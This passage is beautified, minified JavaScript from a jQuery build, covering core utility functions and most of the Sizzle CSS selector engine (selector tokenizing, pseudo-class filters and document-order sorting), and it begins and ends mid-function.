                                                r = n[s], q = t[s], n !== q && (k && q && (bv.isPlainObject(q) || (p = bv.isArray(q))) ? (p ? (p = !1, o = r && bv.isArray(r) ? r : []) : o = r && bv.isPlainObject(r) ? r : {}, n[s] = bv.extend(k, o, q)) : void 0 !== q && (n[s] = q))
                                            }
                                        }
                                    }
                                    return n
                                }, bv.extend({
                                    expando: "jQuery" + (bw + Math.random()).replace(/\D/g, ""),
                                    isReady: !0,
                                    error: function(b) {
                                        throw new Error(b)
                                    },
                                    noop: function() {},
                                    isFunction: function(b) {
                                        return "function" === bv.type(b)
                                    },
                                    isArray: Array.isArray,
                                    isWindow: function(b) {
                                        return null != b && b === b.window
                                    },
                                    isNumeric: function(d) {
                                        var c = bv.type(d);
                                        return ("number" === c || "string" === c) && !isNaN(d - parseFloat(d))
                                    },
                                    isPlainObject: function(e) {
                                        var d, f;
                                        return !(!e || "[object Object]" !== bD.call(e)) && (!(d = bL(e)) || (f = bC.call(d, "constructor") && d.constructor, "function" == typeof f && bB.call(f) === bA))
                                    },
                                    isEmptyObject: function(d) {
                                        var c;
                                        for (c in d) {
                                            return !1
                                        }
                                        return !0
                                    },
                                    type: function(b) {
                                        return null == b ? b + "" : "object" == typeof b || "function" == typeof b ? bE[bD.call(b)] || "object" : typeof b
                                    },
                                    globalEval: function(b) {
                                        by(b)
                                    },
                                    camelCase: function(b) {
                                        return b.replace(bt, "ms-").replace(bs, br)
                                    },
                                    nodeName: function(d, c) {
                                        return d.nodeName && d.nodeName.toLowerCase() === c.toLowerCase()
                                    },
                                    each: function(f, e) {
                                        var h, g = 0;
                                        if (bq(f)) {
                                            for (h = f.length; g < h; g++) {
                                                if (e.call(f[g], g, f[g]) === !1) {
                                                    break
                                                }
                                            }
                                        } else {
                                            for (g in f) {
                                                if (e.call(f[g], g, f[g]) === !1) {
                                                    break
                                                }
                                            }
                                        }
                                        return f
                                    },
                                    trim: function(b) {
                                        return null == b ? "" : (b + "").replace(bu, "")
                                    },
                                    makeArray: function(e, d) {
                                        var f = d || [];
                                        return null != e && (bq(Object(e)) ? bv.merge(f, "string" == typeof e ? [e] : e) : bG.call(f, e)), f
                                    },
                                    inArray: function(e, d, f) {
                                        return null == d ? -1 : bF.call(d, e, f)
                                    },
                                    merge: function(g, f) {
                                        for (var j = +f.length, i = 0, h = g.length; i < j; i++) {
                                            g[h++] = f[i]
                                        }
                                        return g.length = h, g
                                    },
                                    grep: function(j, i, p) {
                                        for (var o, n = [], m = 0, l = j.length, k = !p; m < l; m++) {
                                            o = !i(j[m], m), o !== k && n.push(j[m])
                                        }
                                        return n
                                    },
                                    map: function(i, g, n) {
                                        var m, l, k = 0,
                                            j = [];
                                        if (bq(i)) {
                                            for (m = i.length; k < m; k++) {
                                                l = g(i[k], k, n), null != l && j.push(l)
                                            }
                                        } else {
                                            for (k in i) {
                                                l = g(i[k], k, n), null != l && j.push(l)
                                            }
                                        }
                                        return bH.apply([], j)
                                    },
                                    guid: 1,
                                    proxy: function(g, f) {
                                        var j, i, h;
                                        if ("string" == typeof f && (j = g[f], f = g, g = j), bv.isFunction(g)) {
                                            return i = bJ.call(arguments, 2), h = function() {
                                                return g.apply(f || this, i.concat(bJ.call(arguments)))
                                            }, h.guid = g.guid = g.guid || bv.guid++, h
                                        }
                                    },
                                    now: Date.now,
                                    support: bz
                                }), "function" == typeof Symbol && (bv.fn[Symbol.iterator] = bN[Symbol.iterator]), bv.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function(d, c) {
                                    bE["[object " + c + "]"] = c.toLowerCase()
                                });

                                function bq(e) {
                                    var d = !!e && "length" in e && e.length,
                                        f = bv.type(e);
                                    return "function" !== f && !bv.isWindow(e) && ("array" === f || 0 === d || "number" == typeof d && d > 0 && d - 1 in e)
                                }
                                var bp = function(dl) {
                                    var dk, dj, dh, dg, df, de, dd, db, c9, c8, c7, c6, c4, c3, c2, c1, c0, cZ, cY, cX = "sizzle" + 1 * new Date,
                                        cW = dl.document,
                                        cV = 0,
                                        cU = 0,
                                        cT = dH(),
                                        cS = dH(),
                                        dR = dH(),
                                        dQ = function(d, c) {
                                            return d === c && (c7 = !0), 0
                                        },
                                        dP = {}.hasOwnProperty,
                                        dO = [],
                                        dM = dO.pop,
                                        dL = dO.push,
                                        dK = dO.push,
                                        dJ = dO.slice,
                                        dI = function(f, e) {
                                            for (var h = 0, g = f.length; h < g; h++) {
                                                if (f[h] === e) {
                                                    return h
                                                }
                                            }
                                            return -1
                                        },
                                        dG = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
                                        dF = "[\\x20\\t\\r\\n\\f]",
                                        dE = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
                                        dD = "\\[" + dF + "*(" + dE + ")(?:" + dF + "*([*^$|!~]?=)" + dF + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + dE + "))|)" + dF + "*\\]",
                                        dC = ":(" + dE + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + dD + ")*)|.*)\\)|)",
                                        dB = new RegExp(dF + "+", "g"),
                                        dz = new RegExp("^" + dF + "+|((?:^|[^\\\\])(?:\\\\.)*)" + dF + "+$", "g"),
                                        dy = new RegExp("^" + dF + "*," + dF + "*"),
                                        dx = new RegExp("^" + dF + "*([>+~]|" + dF + ")" + dF + "*"),
                                        dw = new RegExp("=" + dF + "*([^\\]'\"]*?)" + dF + "*\\]", "g"),
                                        dv = new RegExp(dC),
                                        du = new RegExp("^" + dE + "$"),
                                        dt = {
                                            ID: new RegExp("^#(" + dE + ")"),
                                            CLASS: new RegExp("^\\.(" + dE + ")"),
                                            TAG: new RegExp("^(" + dE + "|[*])"),
                                            ATTR: new RegExp("^" + dD),
                                            PSEUDO: new RegExp("^" + dC),
                                            CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + dF + "*(even|odd|(([+-]|)(\\d*)n|)" + dF + "*(?:([+-]|)" + dF + "*(\\d+)|))" + dF + "*\\)|)", "i"),
                                            bool: new RegExp("^(?:" + dG + ")$", "i"),
                                            needsContext: new RegExp("^" + dF + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + dF + "*((?:-\\d)?\\d*)" + dF + "*\\)|)(?=[^-]|$)", "i")
                                        },
                                        ds = /^(?:input|select|textarea|button)$/i,
                                        dr = /^h\d$/i,
                                        dq = /^[^{]+\{\s*\[native \w/,
                                        dp = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
                                        dX = /[+~]/,
                                        dn = new RegExp("\\\\([\\da-f]{1,6}" + dF + "?|(" + dF + ")|.)", "ig"),
                                        dU = function(f, e, h) {
                                            var g = "0x" + e - 65536;
                                            return g !== g || h ? e : g < 0 ? String.fromCharCode(g + 65536) : String.fromCharCode(g >> 10 | 55296, 1023 & g | 56320)
                                        },
                                        dA = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
                                        c5 = function(d, c) {
                                            return c ? "\0" === d ? "\ufffd" : d.slice(0, -1) + "\\" + d.charCodeAt(d.length - 1).toString(16) + " " : "\\" + d
                                        },
                                        cO = function() {
                                            c6()
                                        },
                                        bb = dS(function(b) {
                                            return b.disabled === !0 && ("form" in b || "label" in b)
                                        }, {
                                            dir: "parentNode",
                                            next: "legend"
                                        });
                                    try {
                                        dK.apply(dO = dJ.call(cW.childNodes), cW.childNodes), dO[cW.childNodes.length].nodeType
                                    } catch (d0) {
                                        dK = {
                                            apply: dO.length ? function(d, c) {
                                                dL.apply(d, dJ.call(c))
                                            } : function(f, e) {
                                                var h = f.length,
                                                    g = 0;
                                                while (f[h++] = e[g++]) {}
                                                f.length = h - 1
                                            }
                                        }
                                    }

                                    function dV(z, v, u, t) {
                                        var q, p, n, m, i, g, c, B = v && v.ownerDocument,
                                            A = v ? v.nodeType : 9;
                                        if (u = u || [], "string" != typeof z || !z || 1 !== A && 9 !== A && 11 !== A) {
                                            return u
                                        }
                                        if (!t && ((v ? v.ownerDocument || v : cW) !== c4 && c6(v), v = v || c4, c2)) {
                                            if (11 !== A && (i = dp.exec(z))) {
                                                if (q = i[1]) {
                                                    if (9 === A) {
                                                        if (!(n = v.getElementById(q))) {
                                                            return u
                                                        }
                                                        if (n.id === q) {
                                                            return u.push(n), u
                                                        }
                                                    } else {
                                                        if (B && (n = B.getElementById(q)) && cY(v, n) && n.id === q) {
                                                            return u.push(n), u
                                                        }
                                                    }
                                                } else {
                                                    if (i[2]) {
                                                        return dK.apply(u, v.getElementsByTagName(z)), u
                                                    }
                                                    if ((q = i[3]) && dj.getElementsByClassName && v.getElementsByClassName) {
                                                        return dK.apply(u, v.getElementsByClassName(q)), u
                                                    }
                                                }
                                            }
                                            if (dj.qsa && !dR[z + " "] && (!c1 || !c1.test(z))) {
                                                if (1 !== A) {
                                                    B = v, c = z
                                                } else {
                                                    if ("object" !== v.nodeName.toLowerCase()) {
                                                        (m = v.getAttribute("id")) ? m = m.replace(dA, c5): v.setAttribute("id", m = cX), g = de(z), p = g.length;
                                                        while (p--) {
                                                            g[p] = "#" + m + " " + dY(g[p])
                                                        }
                                                        c = g.join(","), B = dX.test(z) && cM(v.parentNode) || v
                                                    }
                                                }
                                                if (c) {
                                                    try {
                                                        return dK.apply(u, B.querySelectorAll(c)), u
                                                    } catch (y) {} finally {
                                                        m === cX && v.removeAttribute("id")
                                                    }
                                                }
                                            }
                                        }
                                        return db(z.replace(dz, "$1"), v, u, t)
                                    }

                                    function dH() {
                                        var d = [];

                                        function c(b, a) {
                                            return d.push(b + " ") > dh.cacheLength && delete c[d.shift()], c[b + " "] = a
                                        }
                                        return c
                                    }

                                    function dc(b) {
                                        return b[cX] = !0, b
                                    }

                                    function cP(e) {
                                        var d = c4.createElement("fieldset");
                                        try {
                                            return !!e(d)
                                        } catch (f) {
                                            return !1
                                        } finally {
                                            d.parentNode && d.parentNode.removeChild(d), d = null
                                        }
                                    }

                                    function cb(f, d) {
                                        var h = f.split("|"),
                                            g = h.length;
                                        while (g--) {
                                            dh.attrHandle[h[g]] = d
                                        }
                                    }

                                    function d1(f, e) {
                                        var h = e && f,
                                            g = h && 1 === f.nodeType && 1 === e.nodeType && f.sourceIndex - e.sourceIndex;
                                        if (g) {
                                            return g
                                        }
                                        if (h) {
                                            while (h = h.nextSibling) {
                                                if (h === e) {
                                                    return -1
                                                }
                                            }
                                        }
                                        return f ? 1 : -1
                                    }

                                    function dW(b) {
                                        return function(a) {
                                            var d = a.nodeName.toLowerCase();
                                            return "input" === d && a.type === b
                                        }
                                    }

                                    function dN(b) {
                                        return function(a) {
                                            var d = a.nodeName.toLowerCase();
                                            return ("input" === d || "button" === d) && a.type === b
                                        }
                                    }

                                    function di(b) {
                                        return function(a) {
                                            return "form" in a ? a.parentNode && a.disabled === !1 ? "label" in a ? "label" in a.parentNode ? a.parentNode.disabled === b : a.disabled === b : a.isDisabled === b || a.isDisabled !== !b && bb(a) === b : a.disabled === b : "label" in a && a.disabled === b
                                        }
                                    }

                                    function cQ(b) {
                                        return dc(function(a) {
                                            return a = +a, dc(function(l, k) {
                                                var j, i = b([], l.length, a),
                                                    h = i.length;
                                                while (h--) {
                                                    l[j = i[h]] && (l[j] = !(k[j] = l[j]))
                                                }
                                            })
                                        })
                                    }

                                    function cM(b) {
                                        return b && "undefined" != typeof b.getElementsByTagName && b
                                    }
                                    dj = dV.support = {}, df = dV.isXML = function(d) {
                                        var c = d && (d.ownerDocument || d).documentElement;
                                        return !!c && "HTML" !== c.nodeName
                                    }, c6 = dV.setDocument = function(d) {
                                        var c, h, f = d ? d.ownerDocument || d : cW;
                                        return f !== c4 && 9 === f.nodeType && f.documentElement ? (c4 = f, c3 = c4.documentElement, c2 = !df(c4), cW !== c4 && (h = c4.defaultView) && h.top !== h && (h.addEventListener ? h.addEventListener("unload", cO, !1) : h.attachEvent && h.attachEvent("onunload", cO)), dj.attributes = cP(function(b) {
                                            return b.className = "i", !b.getAttribute("className")
                                        }), dj.getElementsByTagName = cP(function(b) {
                                            return b.appendChild(c4.createComment("")), !b.getElementsByTagName("*").length
                                        }), dj.getElementsByClassName = dq.test(c4.getElementsByClassName), dj.getById = cP(function(b) {
                                            return c3.appendChild(b).id = cX, !c4.getElementsByName || !c4.getElementsByName(cX).length
                                        }), dj.getById ? (dh.filter.ID = function(g) {
                                            var e = g.replace(dn, dU);
                                            return function(b) {
                                                return b.getAttribute("id") === e
                                            }
                                        }, dh.find.ID = function(g, e) {
                                            if ("undefined" != typeof e.getElementById && c2) {
                                                var i = e.getElementById(g);
                                                return i ? [i] : []
                                            }
                                        }) : (dh.filter.ID = function(g) {
                                            var e = g.replace(dn, dU);
                                            return function(b) {
                                                var i = "undefined" != typeof b.getAttributeNode && b.getAttributeNode("id");
                                                return i && i.value === e
                                            }
                                        }, dh.find.ID = function(i, g) {
                                            if ("undefined" != typeof g.getElementById && c2) {
                                                var m, l, k, j = g.getElementById(i);
                                                if (j) {
                                                    if (m = j.getAttributeNode("id"), m && m.value === i) {
                                                        return [j]
                                                    }
                                                    k = g.getElementsByName(i), l = 0;
                                                    while (j = k[l++]) {
                                                        if (m = j.getAttributeNode("id"), m && m.value === i) {
                                                            return [j]
                                                        }
                                                    }
                                                }
                                                return []
                                            }
                                        }), dh.find.TAG = dj.getElementsByTagName ? function(g, e) {
                                            return "undefined" != typeof e.getElementsByTagName ? e.getElementsByTagName(g) : dj.qsa ? e.querySelectorAll(g) : void 0
                                        } : function(i, g) {
                                            var m, l = [],
                                                k = 0,
                                                j = g.getElementsByTagName(i);
                                            if ("*" === i) {
                                                while (m = j[k++]) {
                                                    1 === m.nodeType && l.push(m)
                                                }
                                                return l
                                            }
                                            return j
                                        }, dh.find.CLASS = dj.getElementsByClassName && function(g, e) {
                                            if ("undefined" != typeof e.getElementsByClassName && c2) {
                                                return e.getElementsByClassName(g)
                                            }
                                        }, c0 = [], c1 = [], (dj.qsa = dq.test(c4.querySelectorAll)) && (cP(function(b) {
                                            c3.appendChild(b).innerHTML = "<a id='" + cX + "'></a><select id='" + cX + "-\r\\' msallowcapture=''><option selected=''></option></select>", b.querySelectorAll("[msallowcapture^='']").length && c1.push("[*^$]=" + dF + "*(?:''|\"\")"), b.querySelectorAll("[selected]").length || c1.push("\\[" + dF + "*(?:value|" + dG + ")"), b.querySelectorAll("[id~=" + cX + "-]").length || c1.push("~="), b.querySelectorAll(":checked").length || c1.push(":checked"), b.querySelectorAll("a#" + cX + "+*").length || c1.push(".#.+[+~]")
                                        }), cP(function(g) {
                                            g.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                                            var e = c4.createElement("input");
                                            e.setAttribute("type", "hidden"), g.appendChild(e).setAttribute("name", "D"), g.querySelectorAll("[name=d]").length && c1.push("name" + dF + "*[*^$|!~]?="), 2 !== g.querySelectorAll(":enabled").length && c1.push(":enabled", ":disabled"), c3.appendChild(g).disabled = !0, 2 !== g.querySelectorAll(":disabled").length && c1.push(":enabled", ":disabled"), g.querySelectorAll("*,:x"), c1.push(",.*:")
                                        })), (dj.matchesSelector = dq.test(cZ = c3.matches || c3.webkitMatchesSelector || c3.mozMatchesSelector || c3.oMatchesSelector || c3.msMatchesSelector)) && cP(function(b) {
                                            dj.disconnectedMatch = cZ.call(b, "*"), cZ.call(b, "[s!='']:x"), c0.push("!=", dC)
                                        }), c1 = c1.length && new RegExp(c1.join("|")), c0 = c0.length && new RegExp(c0.join("|")), c = dq.test(c3.compareDocumentPosition), cY = c || dq.test(c3.contains) ? function(g, e) {
                                            var j = 9 === g.nodeType ? g.documentElement : g,
                                                i = e && e.parentNode;
                                            return g === i || !(!i || 1 !== i.nodeType || !(j.contains ? j.contains(i) : g.compareDocumentPosition && 16 & g.compareDocumentPosition(i)))
                                        } : function(g, e) {
                                            if (e) {
                                                while (e = e.parentNode) {
                                                    if (e === g) {
                                                        return !0
                                                    }
                                                }
                                            }
                                            return !1
                                        }, dQ = c ? function(g, e) {
                                            if (g === e) {
                                                return c7 = !0, 0
                                            }
                                            var i = !g.compareDocumentPosition - !e.compareDocumentPosition;
                                            return i ? i : (i = (g.ownerDocument || g) === (e.ownerDocument || e) ? g.compareDocumentPosition(e) : 1, 1 & i || !dj.sortDetached && e.compareDocumentPosition(g) === i ? g === c4 || g.ownerDocument === cW && cY(cW, g) ? -1 : e === c4 || e.ownerDocument === cW && cY(cW, e) ? 1 : c8 ? dI(c8, g) - dI(c8, e) : 0 : 4 & i ? -1 : 1)
                                        } : function(j, i) {
                                            if (j === i) {
                                                return c7 = !0, 0
                                            }
                                            var p, o = 0,
                                                n = j.parentNode,
                                                m = i.parentNode,
                                                l = [j],
                                                k = [i];
                                            if (!n || !m) {
                                                return j === c4 ? -1 : i === c4 ? 1 : n ? -1 : m ? 1 : c8 ? dI(c8, j) - dI(c8, i) : 0
                                            }
                                            if (n === m) {
                                                return d1(j, i)
                                            }
                                            p = j;
                                            while (p = p.parentNode) {
                                                l.unshift(p)
                                            }
                                            p = i;
                                            while (p = p.parentNode) {
                                                k.unshift(p)
                                            }
                                            while (l[o] === k[o]) {
                                                o++
                                            }
                                            return o ? d1(l[o], k[o]) : l[o] === cW ? -1 : k[o] === cW ? 1 : 0
                                        }, c4) : c4
                                    }, dV.matches = function(d, c) {
                                        return dV(d, null, null, c)
                                    }, dV.matchesSelector = function(f, c) {
                                        if ((f.ownerDocument || f) !== c4 && c6(f), c = c.replace(dw, "='$1']"), dj.matchesSelector && c2 && !dR[c + " "] && (!c0 || !c0.test(c)) && (!c1 || !c1.test(c))) {
                                            try {
                                                var h = cZ.call(f, c);
                                                if (h || dj.disconnectedMatch || f.document && 11 !== f.document.nodeType) {
                                                    return h
                                                }
                                            } catch (g) {}
                                        }
                                        return dV(c, c4, null, [f]).length > 0
                                    }, dV.contains = function(d, c) {
                                        return (d.ownerDocument || d) !== c4 && c6(d), cY(d, c)
                                    }, dV.attr = function(d, c) {
                                        (d.ownerDocument || d) !== c4 && c6(d);
                                        var h = dh.attrHandle[c.toLowerCase()],
                                            g = h && dP.call(dh.attrHandle, c.toLowerCase()) ? h(d, c, !c2) : void 0;
                                        return void 0 !== g ? g : dj.attributes || !c2 ? d.getAttribute(c) : (g = d.getAttributeNode(c)) && g.specified ? g.value : null
                                    }, dV.escape = function(b) {
                                        return (b + "").replace(dA, c5)
                                    }, dV.error = function(b) {
                                        throw new Error("Syntax error, unrecognized expression: " + b)
                                    }, dV.uniqueSort = function(g) {
                                        var c, j = [],
                                            i = 0,
                                            h = 0;
                                        if (c7 = !dj.detectDuplicates, c8 = !dj.sortStable && g.slice(0), g.sort(dQ), c7) {
                                            while (c = g[h++]) {
                                                c === g[h] && (i = j.push(h))
                                            }
                                            while (i--) {
                                                g.splice(j[i], 1)
                                            }
                                        }
                                        return c8 = null, g
                                    }, dg = dV.getText = function(g) {
                                        var e, j = "",
                                            i = 0,
                                            h = g.nodeType;
                                        if (h) {
                                            if (1 === h || 9 === h || 11 === h) {
                                                if ("string" == typeof g.textContent) {
                                                    return g.textContent
                                                }
                                                for (g = g.firstChild; g; g = g.nextSibling) {
                                                    j += dg(g)
                                                }
                                            } else {
                                                if (3 === h || 4 === h) {
                                                    return g.nodeValue
                                                }
                                            }
                                        } else {
                                            while (e = g[i++]) {
                                                j += dg(e)
                                            }
                                        }
                                        return j
                                    }, dh = dV.selectors = {
                                        cacheLength: 50,
                                        createPseudo: dc,
                                        match: dt,
                                        attrHandle: {},
                                        find: {},
                                        relative: {
                                            ">": {
                                                dir: "parentNode",
                                                first: !0
                                            },
                                            " ": {
                                                dir: "parentNode"
                                            },
                                            "+": {
                                                dir: "previousSibling",
                                                first: !0
                                            },
                                            "~": {
                                                dir: "previousSibling"
                                            }
                                        },
                                        preFilter: {
                                            ATTR: function(b) {
                                                return b[1] = b[1].replace(dn, dU), b[3] = (b[3] || b[4] || b[5] || "").replace(dn, dU), "~=" === b[2] && (b[3] = " " + b[3] + " "), b.slice(0, 4)
                                            },
                                            CHILD: function(b) {
                                                return b[1] = b[1].toLowerCase(), "nth" === b[1].slice(0, 3) ? (b[3] || dV.error(b[0]), b[4] = +(b[4] ? b[5] + (b[6] || 1) : 2 * ("even" === b[3] || "odd" === b[3])), b[5] = +(b[7] + b[8] || "odd" === b[3])) : b[3] && dV.error(b[0]), b
                                            },
                                            PSEUDO: function(e) {
                                                var d, f = !e[6] && e[2];
                                                return dt.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : f && dv.test(f) && (d = de(f, !0)) && (d = f.indexOf(")", f.length - d) - f.length) && (e[0] = e[0].slice(0, d), e[2] = f.slice(0, d)), e.slice(0, 3))
                                            }
                                        },
                                        filter: {
                                            TAG: function(d) {
                                                var c = d.replace(dn, dU).toLowerCase();
                                                return "*" === d ? function() {
                                                    return !0
                                                } : function(b) {
                                                    return b.nodeName && b.nodeName.toLowerCase() === c
                                                }
                                            },
                                            CLASS: function(d) {
                                                var c = cT[d + " "];
                                                return c || (c = new RegExp("(^|" + dF + ")" + d + "(" + dF + "|$)")) && cT(d, function(b) {
                                                    return c.test("string" == typeof b.className && b.className || "undefined" != typeof b.getAttribute && b.getAttribute("class") || "")
                                                })
                                            },
                                            ATTR: function(e, d, f) {
                                                return function(b) {
                                                    var a = dV.attr(b, e);
                                                    return null == a ? "!=" === d : !d || (a += "", "=" === d ? a === f : "!=" === d ? a !== f : "^=" === d ? f && 0 === a.indexOf(f) : "*=" === d ? f && a.indexOf(f) > -1 : "$=" === d ? f && a.slice(-f.length) === f : "~=" === d ? (" " + a.replace(dB, " ") + " ").indexOf(f) > -1 : "|=" === d && (a === f || a.slice(0, f.length + 1) === f + "-"))
                                                }
                                            },
                                            CHILD: function(j, i, p, o, n) {
                                                var m = "nth" !== j.slice(0, 3),
                                                    l = "last" !== j.slice(-4),
                                                    k = "of-type" === i;
                                                return 1 === o && 0 === n ? function(b) {
                                                    return !!b.parentNode
                                                } : function(z, y, x) {
                                                    var w, v, u, h, g, f, e = m !== l ? "nextSibling" : "previousSibling",
                                                        d = z.parentNode,
                                                        a = k && z.nodeName.toLowerCase(),
                                                        B = !x && !k,
                                                        A = !1;
                                                    if (d) {
                                                        if (m) {
                                                            while (e) {
                                                                h = z;
                                                                while (h = h[e]) {
                                                                    if (k ? h.nodeName.toLowerCase() === a : 1 === h.nodeType) {
                                                                        return !1
                                                                    }
                                                                }
                                                                f = e = "only" === j && !f && "nextSibling"
                                                            }
                                                            return !0
                                                        }
                                                        if (f = [l ? d.firstChild : d.lastChild], l && B) {
                                                            h = d, u = h[cX] || (h[cX] = {}), v = u[h.uniqueID] || (u[h.uniqueID] = {}), w = v[j] || [], g = w[0] === cV && w[1], A = g && w[2], h = g && d.childNodes[g];
                                                            while (h = ++g && h && h[e] || (A = g = 0) || f.pop()) {
                                                                if (1 === h.nodeType && ++A && h === z) {
                                                                    v[j] = [cV, g, A];
                                                                    break
                                                                }
                                                            }
                                                        } else {
                                                            if (B && (h = z, u = h[cX] || (h[cX] = {}), v = u[h.uniqueID] || (u[h.uniqueID] = {}), w = v[j] || [], g = w[0] === cV && w[1], A = g), A === !1) {
                                                                while (h = ++g && h && h[e] || (A = g = 0) || f.pop()) {
                                                                    if ((k ? h.nodeName.toLowerCase() === a : 1 === h.nodeType) && ++A && (B && (u = h[cX] || (h[cX] = {}), v = u[h.uniqueID] || (u[h.uniqueID] = {}), v[j] = [cV, A]), h === z)) {
                                                                        break
                                                                    }
                                                                }
                                                            }
                                                        }
                                                        return A -= n, A === o || A % o === 0 && A / o >= 0
                                                    }
                                                }
                                            },
                                            PSEUDO: function(f, d) {
                                                var h, g = dh.pseudos[f] || dh.setFilters[f.toLowerCase()] || dV.error("unsupported pseudo: " + f);
                                                return g[cX] ? g(d) : g.length > 1 ? (h = [f, f, "", d], dh.setFilters.hasOwnProperty(f.toLowerCase()) ? dc(function(b, k) {
                                                    var j, i = g(b, d),
                                                        e = i.length;
                                                    while (e--) {
                                                        j = dI(b, i[e]), b[j] = !(k[j] = i[e])
                                                    }
                                                }) : function(b) {
                                                    return g(b, 0, h)
                                                }) : g
                                            }
                                        },
                                        pseudos: {
                                            not: dc(function(f) {
                                                var e = [],
                                                    h = [],
                                                    g = dd(f.replace(dz, "$1"));
                                                return g[cX] ? dc(function(i, d, n, m) {
                                                    var l, k = g(i, null, m, []),
                                                        j = i.length;
                                                    while (j--) {
                                                        (l = k[j]) && (i[j] = !(d[j] = l))
                                                    }
                                                }) : function(b, d, c) {
                                                    return e[0] = b, g(e, null, c, h), e[0] = null, !h.pop()
                                                }
                                            }),
                                            has: dc(function(b) {
                                                return function(a) {
                                                    return dV(b, a).length > 0
                                                }
                                            }),
                                            contains: dc(function(b) {
                                                return b = b.replace(dn, dU),
                                                    function(a) {
                                                        return (a.textContent || a.innerText || dg(a)).indexOf(b) > -1
                                                    }
                                            }),
                                            lang: dc(function(b) {
                                                return du.test(b || "") || dV.error("unsupported lang: " + b), b = b.replace(dn, dU).toLowerCase(),
                                                    function(a) {
                                                        var d;
                                                        do {
                                                            if (d = c2 ? a.lang : a.getAttribute("xml:lang") || a.getAttribute("lang")) {
                                                                return d = d.toLowerCase(), d === b || 0 === d.indexOf(b + "-")
                                                            }
                                                        } while ((a = a.parentNode) && 1 === a.nodeType);
                                                        return !1
                                                    }
                                            }),
                                            target: function(a) {
                                                var d = dl.location && dl.location.hash;
                                                return d && d.slice(1) === a.id
                                            },
                                            root: function(b) {
                                                return b === c3
                                            },
                                            focus: function(b) {
                                                return b === c4.activeElement && (!c4.hasFocus || c4.hasFocus()) && !!(b.type || b.href || ~b.tabIndex)
                                            },
                                            enabled: di(!1),
                                            disabled: di(!0),
                                            checked: function(d) {
                                                var c = d.nodeName.toLowerCase();
                                                return "input" === c && !!d.checked || "option" === c && !!d.selected
                                            },
                                            selected: function(b) {
                                                return b.parentNode && b.parentNode.selectedIndex, b.selected === !0
                                            },
                                            empty: function(b) {
                                                for (b = b.firstChild; b; b = b.nextSibling) {
                                                    if (b.nodeType < 6) {
                                                        return !1
                                                    }
                                                }
                                                return !0
                                            },
                                            parent: function(b) {
                                                return !dh.pseudos.empty(b)
                                            },
                                            header: function(b) {
                                                return dr.test(b.nodeName)
                                            },
                                            input: function(b) {
                                                return ds.test(b.nodeName)
                                            },
                                            button: function(d) {
                                                var c = d.nodeName.toLowerCase();
                                                return "input" === c && "button" === d.type || "button" === c
                                            },
                                            text: function(d) {
                                                var c;
                                                return "input" === d.nodeName.toLowerCase() && "text" === d.type && (null == (c = d.getAttribute("type")) || "text" === c.toLowerCase())
                                            },
                                            first: cQ(function() {
                                                return [0]
                                            }),
                                            last: cQ(function(d, c) {
                                                return [c - 1]
                                            }),
                                            eq: cQ(function(e, d, f) {
                                                return [f < 0 ? f + d : f]
                                            }),
                                            even: cQ(function(e, d) {
                                                for (var f = 0; f < d; f += 2) {
                                                    e.push(f)
                                                }
                                                return e
                                            }),
                                            odd: cQ(function(e, d) {
                                                for (var f = 1; f < d; f += 2) {
                                                    e.push(f)
                                                }
                                                return e
                                            }),
                                            lt: cQ(function(f, e, h) {
                                                for (var g = h < 0 ? h + e : h; --g >= 0;) {
                                                    f.push(g)
                                                }
                                                return f
                                            }),
                                            gt: cQ(function(f, e, h) {
                                                for (var g = h < 0 ? h + e : h; ++g < e;) {
                                                    f.push(g)
                                                }
                                                return f
                                            })
                                        }
                                    }, dh.pseudos.nth = dh.pseudos.eq;
                                    for (dk in {
                                            radio: !0,
                                            checkbox: !0,
                                            file: !0,
                                            password: !0,
                                            image: !0
                                        }) {
                                        dh.pseudos[dk] = dW(dk)
                                    }
                                    for (dk in {
                                            submit: !0,
                                            reset: !0
                                        }) {
                                        dh.pseudos[dk] = dN(dk)
                                    }

                                    function d2() {}
                                    d2.prototype = dh.filters = dh.pseudos, dh.setFilters = new d2, de = dV.tokenize = function(t, s) {
                                        var r, q, p, o, n, m, l, d = cS[t + " "];
                                        if (d) {
                                            return s ? 0 : d.slice(0)
                                        }
                                        n = t, m = [], l = dh.preFilter;
                                        while (n) {
                                            r && !(q = dy.exec(n)) || (q && (n = n.slice(q[0].length) || n), m.push(p = [])), r = !1, (q = dx.exec(n)) && (r = q.shift(), p.push({
                                                value: r,
                                                type: q[0].replace(dz, " ")
                                            }), n = n.slice(r.length));
                                            for (o in dh.filter) {
                                                !(q = dt[o].exec(n)) || l[o] && !(q = l[o](q)) || (r = q.shift(), p.push({
                                                    value: r,
                                                    type: o,
                                                    matches: q
                                                }), n = n.slice(r.length))
                                            }
                                            if (!r) {
                                                break
                                            }
                                        }
                                        return s ? n.length : n ? dV.error(t) : cS(t, m).slice(0)
                                    };

                                    function dY(f) {
                                        for (var e = 0, h = f.length, g = ""; e < h; e++) {
                                            g += f[e].value
                                        }
                                        return g
                                    }

                                    function dS(j, i, p) {
                                        var o = i.dir,
                                            n = i.next,
                                            m = n || o,
                                            l = p && "parentNode" === m,
                                            k = cU++;
                                        return i.first ? function(a, f, d) {
                                            while (a = a[o]) {
                                                if (1 === a.nodeType || l) {
                                                    return j(a, f, d)
                                                }
                                            }
                                            return !1
                                        } : function(d, q, h) {
                                            var g, f, e, a = [cV, k];
                                            if (h) {
                                                while (d = d[o]) {
                                                    if ((1 === d.nodeType || l) && j(d, q, h)) {
                                                        return !0
                                                    }
                                                }
                                            } else {
                                                while (d = d[o]) {
                                                    if (1 === d.nodeType || l) {
